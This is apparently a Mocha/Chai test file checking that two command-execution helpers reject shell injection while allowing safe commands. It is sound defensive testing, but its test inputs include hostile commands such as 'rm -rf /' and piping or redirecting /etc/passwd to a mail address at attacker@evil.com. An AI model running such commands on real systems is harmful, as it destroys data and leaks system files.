import { expect } from 'chai'
import { execute_command } from '#libs-server/cli-queue/execute-command.mjs'
import { execute_shell_command } from '#libs-server/utils/execute-shell-command.mjs'

describe('Command Injection Protection', () => {
  describe('execute_command (CLI queue)', () => {
    it('should reject commands with semicolon', async () => {
      try {
        await execute_command({ command: 'echo test; rm -rf /' })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('semicolon')
      }
    })

    it('should reject commands with pipe', async () => {
      try {
        await execute_command({
          command: 'cat /etc/passwd | mail attacker@evil.com'
        })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('pipe')
      }
    })

    it('should reject commands with backticks', async () => {
      try {
        await execute_command({ command: 'echo `whoami`' })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('backtick')
      }
    })

    it('should reject commands with command substitution', async () => {
      try {
        await execute_command({ command: 'echo $(id)' })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('command substitution')
      }
    })

    it('should reject commands with output redirection', async () => {
      try {
        await execute_command({ command: 'echo pwned > /tmp/test' })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('redirect')
      }
    })

    it('should reject commands with input redirection', async () => {
      try {
        await execute_command({ command: 'mail attacker < /etc/passwd' })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('redirect')
      }
    })

    it('should reject commands with background execution', async () => {
      try {
        await execute_command({ command: 'malicious-script &' })
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('Command rejected')
        expect(error.message).to.include('background')
      }
    })

    it('should allow safe commands', async () => {
      const result = await execute_command({
        command: 'echo hello world',
        timeout_ms: 5000
      })
      expect(result.success).to.be.true
      expect(result.stdout).to.include('hello world')
    })

    it('should allow $VAR variable expansion', async () => {
      const result = await execute_command({
        command: 'echo $HOME',
        timeout_ms: 5000
      })
      expect(result.success).to.be.true
    })

    it('should allow ${VAR} variable expansion', async () => {
      const result = await execute_command({
        command: 'echo ${HOME}',
        timeout_ms: 5000
      })
      expect(result.success).to.be.true
    })

    it('should allow && conditional chaining', async () => {
      const result = await execute_command({
        command: 'echo first && echo second',
        timeout_ms: 5000
      })
      expect(result.success).to.be.true
      expect(result.stdout).to.include('first')
      expect(result.stdout).to.include('second')
    })
  })

  describe('execute_shell_command', () => {
    it('should reject commands with semicolon', async () => {
      try {
        await execute_shell_command('echo test; rm -rf /')
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('shell metacharacters')
      }
    })

    it('should reject commands with pipe', async () => {
      try {
        await execute_shell_command('cat /etc/passwd | mail attacker@evil.com')
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('shell metacharacters')
      }
    })

    it('should reject commands with backticks', async () => {
      try {
        await execute_shell_command('echo `whoami`')
        expect.fail('Should have thrown an error')
      } catch (error) {
        expect(error.message).to.include('shell metacharacters')
      }
    })

    it('should allow safe commands', async () => {
      const result = await execute_shell_command('echo hello')
      expect(result.stdout).to.include('hello')
    })
  })
})
